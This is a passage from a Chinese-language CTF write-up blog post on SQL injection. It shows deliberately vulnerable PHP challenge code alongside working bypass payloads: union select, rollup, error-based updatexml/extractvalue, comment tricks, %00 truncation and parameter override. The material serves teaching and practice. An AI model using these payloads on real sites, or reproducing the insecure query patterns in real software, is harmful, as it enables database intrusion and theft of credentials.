class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=<span class="string">"SELECT * FROM interest WHERE uname = ''  or 1=1 group by pwd with rollup limit 1 offset 2 #'"</span>;</span><br><span class="line"><span class="comment">#$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";</span></span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'pwd'</span>] == $_POST[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"浜﹀彲璧涜墖锛�"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"涓€棰楄禌鑹囷紒"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>要满足<code>mysql_num_rows($query) == 1</code>和<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code></p>
<p>后者使用group by pwd with rollup在查询结果中加上一行，且pwd字段的值为NULL,以此绕过<code>$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]</code></p>
<p>过滤<code>,</code>则使用<code>limit # offset #</code>来满足<code>mysql_num_rows($query) == 1</code>,fuzz出<code>limit 1 offset 2</code></p>
<p>输入框输入<code>&#39; or 1=1 group by pwd with rollup limit 1 offset 2 #</code></p>
<p><code>CTF{with_rollup_interesting}</code></p>
<h3 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h3><p>index.txt中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">welcome to simplexue</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">    $conn = mysql_connect(&quot;********&quot;, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">    mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">    if ($conn-&gt;connect_error) &#123;</span><br><span class="line">        die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">    printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=post action=index.php&gt;</span><br><span class="line">&lt;input type=text name=user value=&quot;Username&quot;&gt;</span><br><span class="line">&lt;input type=password name=pass value=&quot;Password&quot;&gt;</span><br><span class="line">&lt;input type=submit&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a href=&quot;index.txt&quot;&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>利用user处的注入返回想要的pw</p>
<p>例如 qwe，76d80224611fc919a5d54f0ff9fba446</p>
<p>username值<code>&#39; union select &#39;76d80224611fc919a5d54f0ff9fba446&#39;#</code></p>
<p>password值<code>qwe</code></p>
<p>提交获得flag</p>
<p><code>SimCTF{youhaocongming}</code></p>
<h3 id="Challenge1"><a href="#Challenge1" class="headerlink" title="Challenge1"></a>Challenge1</h3><p>php4fun的题</p>
<p>已经访问不了，本地复现的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#GOAL: get password from admin;</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="string">'db.inc.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clean</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(get_magic_quotes_gpc())&#123;</span><br><span class="line">        $str=stripslashes($str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$username = @clean((string)$_GET[<span class="string">'username'</span>]);</span><br><span class="line">$password = @clean((string)$_GET[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">$query=<span class="string">'SELECT * FROM users WHERE name=\''</span>.$username.<span class="string">'\' AND pass=\''</span>.$password.<span class="string">'\';'</span>;</span><br><span class="line">$result=mysql_query($query);</span><br><span class="line"><span class="keyword">if</span>(!$result || mysql_num_rows($result) &lt; <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Invalid password!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$row = mysql_fetch_assoc($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello "</span>.$row[<span class="string">'name'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your password is:"</span>.$row[<span class="string">'pass'</span>].<span class="string">"&lt;/br&gt;"</span>;</span><br></pre></td></tr></table></figure>
<p>htmlentities将单引号实体化了，所以可用\来将源单引号转义</p>
<p>构造<code>SELECT * FROM users WHERE name=&#39;\&#39; AND pass=&#39; or 1=1 limit 2,3#&#39;;</code></p>
<p>payload：<code>?username=\&amp;password=%20or%201=1%20limit%202,3%23</code></p>
<p><img src="https://i.loli.net/2018/08/05/5b66bd9859694.png" alt="s4.png"></p>
<h3 id="Error-Injection"><a href="#Error-Injection" class="headerlink" title="Error Injection"></a>Error Injection</h3><p>原来貌似是三个白帽上的题，本地复现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $key)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($$key <span class="keyword">as</span> $k =&gt; $v)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array($v))&#123;</span><br><span class="line">            errorBox(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $k[<span class="number">0</span>] !=<span class="string">'_'</span>?$$k = addslashes($v):$$k = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $rstr = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ord($str[$i])&gt;<span class="number">31</span> &amp;&amp; ord($str[$i])&lt;<span class="number">127</span>)&#123;</span><br><span class="line">            $rstr = $rstr.$str[$i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $rstr = str_replace(<span class="string">'\''</span>,<span class="string">''</span>,$rstr);</span><br><span class="line">    <span class="keyword">return</span> $rstr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($message))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\b(select|insert|update|delete)\b/i"</span>,$message))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(filter($message) !== $message)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $sql=<span class="string">"insert guestbook(`message`) value('$message');"</span>;</span><br><span class="line">    mysql_query($sql);</span><br><span class="line">    $sql = <span class="string">"select * from guestbook order by id limit 0,5;"</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result)&#123;</span><br><span class="line">        <span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">            $id = $row[<span class="string">'id'</span>];</span><br><span class="line">            $message = $row[<span class="string">'message'</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"|$id|=&gt;|$message|&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $message = stripcslashes($message);</span><br><span class="line">    $sql = <span class="string">"delete from guestbook where id=$id or message ='$message';"</span>;</span><br><span class="line">    <span class="keyword">if</span>(!mysql_query($sql))&#123;</span><br><span class="line">        <span class="keyword">print</span>(mysql_error());</span><br><span class="line">        $sql = <span class="string">"delete from guestbook where id=$id"</span>;</span><br><span class="line">        mysql_query($sql);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>需要绕过单引号和preg_match</p>
<p>因为stripcslashes函数，可以使用<code>1\x27</code>创造单引号</p>
<p><code>/*!00000select*/</code>绕过preg_match</p>
<blockquote>
<p>在mysql,00000这5位代表版本号，表示只有在大于该版本的mysql中不作为注释</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; /*!00000select 1*/;</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">| 1 |</span><br><span class="line">+---+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>利用updatexml报错</p>
<blockquote>
<p>UpdateXML(xml_target, xpath_expr, new_xml)<br>updatexml函数有三个参数，作用是xml替换，把xml_target中被xpath_expr匹配到的部分使用new_xml替换</p>
</blockquote>
<p>concat得到带<code>&#39;</code>的数据，单引号为非法字符，因此报错，输出错误内容</p>
<p><code>?message=1\x27 and updatexml(0,concat(0x27,(/*!00000select version()*/)),0)%23</code></p>
<p><img src="https://i.loli.net/2018/08/06/5b68166a50254.png" alt="s5.png"></p>
<p>利用ExtractValue()报错</p>
<blockquote>
<p>ExtractValue(xml_frag, xpath_expr) 得到xml_frag中被xpath_expr匹配到的值</p>
</blockquote>
<p><code>?message=1\x27 and ExtractValue(0,concat(0x27,(/*!00000select version()*/)))%23</code></p>
<p><img src="https://i.loli.net/2018/08/06/5b68175e6362b.png" alt="s6.png"></p>
<p>参考： <a href="https://0x48.pw/2016/04/08/0x18/" target="_blank" rel="noopener">https://0x48.pw/2016/04/08/0x18/</a></p>
<h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$link = mysqli_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span class="string">'root'</span>);</span><br><span class="line">mysqli_select_db($link, <span class="string">'code'</span>);</span><br><span class="line"></span><br><span class="line">$table = addslashes($_GET[<span class="string">'table'</span>]);</span><br><span class="line">$sql = <span class="string">"UPDATE `&#123;$table&#125;` </span></span><br><span class="line"><span class="string">        SET `username`='admin'</span></span><br><span class="line"><span class="string">        WHERE id=1"</span>;</span><br><span class="line"><span class="keyword">if</span>(!mysqli_query($link, $sql)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(mysqli_error($link));</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close($link);</span><br></pre></td></tr></table></figure>
<p>首先addslashes为单双引号、反斜线加上了<code>\</code></p>
<p>sql语句是update，可以使用left join，extractvalue报错注入，char函数替换单引号，闭合反引号</p>
<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=test` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select version()),0x7e)))) tt on tt.user=`t.username</span><br></pre></td></tr></table></figure></p>
<p>注入之后为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">update `table` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=`t.username`</span><br><span class="line"> set username =&apos;admin&apos; </span><br><span class="line">where id=1;</span><br></pre></td></tr></table></figure></p>
<p><a href="https://paper.seebug.org/216/" target="_blank" rel="noopener">关于一个sql注入注入题目的思考</a></p>
<h3 id="Are-you-brave-enough"><a href="#Are-you-brave-enough" class="headerlink" title="Are you brave enough?"></a>Are you brave enough?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$db  = mysqli_connect(<span class="string">'localhost'</span>,<span class="string">'web_brave'</span>,<span class="string">''</span>,<span class="string">'web_brave'</span>);</span><br><span class="line"></span><br><span class="line">$id  = @$_GET[<span class="string">'id'</span>];</span><br><span class="line">$key = $db-&gt;real_escape_string(@$_GET[<span class="string">'key'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\s|[\(\)\'"\/\\=&amp;\|1-9]|#|\/\*|into|file|case|group|order|having|limit|and|or|not|null|union|select|from|where|--/i'</span>, $id))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Attack Detected. Try harder: '</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]); <span class="comment">// attack detected</span></span><br><span class="line"></span><br><span class="line">$query = <span class="string">"SELECT `id`,`name`,`key` FROM `users` WHERE `id` = $id AND `key` = '"</span>.$key.<span class="string">"'"</span>;</span><br><span class="line">$q = $db-&gt;query($query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($q-&gt;num_rows) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;h3&gt;Users:&lt;/h3&gt;&lt;ul&gt;'</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $q-&gt;fetch_array()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;li&gt;'</span>.$row[<span class="string">'name'</span>].<span class="string">'&lt;/li&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;/ul&gt;'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'&lt;h3&gt;Nop.&lt;/h3&gt;'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>id被过滤了很多东西，key也有<code>real_escape_string</code>函数做转义处理，但id没有过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`</span><br></pre></td></tr></table></figure></p>
<p>利用%00截断，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=`id`;%00</span><br></pre></td></tr></table></figure></p>
<p>列出所有name</p>
<p><img src="https://i.loli.net/2018/08/07/5b69539f8cf18.png" alt="s7.png"></p>
<h3 id="wanna-to-see-your-hat"><a href="#wanna-to-see-your-hat" class="headerlink" title="wanna to see your hat?"></a>wanna to see your hat?</h3><p><a href="http://120.132.56.20:1515/" target="_blank" rel="noopener">http://120.132.56.20:1515/</a></p>
<p>.svn得到源码</p>
<p>一部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_POST[&quot;name&quot;]))&#123;</span><br><span class="line">  $name = str_replace(&quot;&apos;&quot;, &quot;&quot;, trim(waf($_POST[&quot;name&quot;])));</span><br><span class="line">  if (strlen($name) &gt; 11)&#123;</span><br><span class="line">    echo(&quot;&lt;script&gt;alert(&apos;name too long&apos;)&lt;/script&gt;&quot;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">    $sql = &quot;select count(*) from t_info where username = &apos;$name&apos; or nickname = &apos;$name&apos;&quot;;</span><br><span class="line">    echo $sql;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $row = mysql_fetch_array($result);</span><br><span class="line">    if ($row[0])&#123;</span><br><span class="line">      $_SESSION[&apos;hat&apos;] = &apos;black&apos;;</span><br><span class="line">      echo &apos;good job&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">	$_SESSION[&apos;hat&apos;] = &apos;green&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    header(&quot;Location: index.php&quot;);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p> 构造<code>or/*1*/1#\</code>,抓包通过sql语句发现\被转义，而’则会被\替换</p>
<p> 在构造<code>or/**/1#&#39;</code>得到flag,或更短的<code>or(1)#&#39;</code></p>
<p> <code>flag{good_job_white_hat}</code></p>
<h3 id="Naughty-ads"><a href="#Naughty-ads" class="headerlink" title="Naughty ads"></a>Naughty ads</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"select * from xxx where id = '&#123;$_GET['id']&#125;'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">$result = sql_query($_GET[<span class="string">'id'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>绕过正则<code>?id=1%27/*1*/union%20slect%20*%20from%20flag%20%23</code></p>
<p>或者get<code>?id=1&#39; union select * from flag %23</code>,同时post<code>id=1</code>,因为<code>$_REQUEST</code>,利用Environment, Get, Post, Cookie, Server的数据的加载顺序post参数覆盖同名get参数</p>
<p><img src="https://i.loli.net/2018/08/07/5b6959c30bae1.png" alt="s8.png"></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">J0k3r</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://j0k3r.top/2018/08/07/inject/">http://j0k3r.top/2018/08/07/inject/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://j0k3r.top">J0k3r's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL-注入/">SQL 注入</a><a class="post-meta__tags" href="/tags/代码审计/">代码审计</a></div><div class="post-qr-code"><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/alipay.jpg"><div class="post-qr-code__desc">支付宝打赏</div></div><div class="post-qr-code-item"><img class="post-qr-code__img" src="../../../../img/wechat.jpg"><div class="post-qr-code__desc">微信打赏</div></div></div><div class="social-share"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/08/09/code-inject/"><i class="fa fa-chevron-left">  </i><span>代码注入漏洞</span></a></div><div class="next-post pull-right"><a href="/2018/07/25/ctfs_18_7/"><span>CTFs.18.7</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'true' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'yeOeLCiDRMa7CAnJy2jxA2IY-gzGzoHsz',
  appKey:'eAgtubAYTMshS76hpc1F1UBG',
  placeholder:'Just go go',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(https://i.loli.net/2020/02/01/sHdohVBU8nlmARP.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By J0k3r</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"superSample":2,"width":210,"height":420,"position":"left","hOffset":0,"vOffset":-20},"log":false,"tagMode":false});</script></body></html>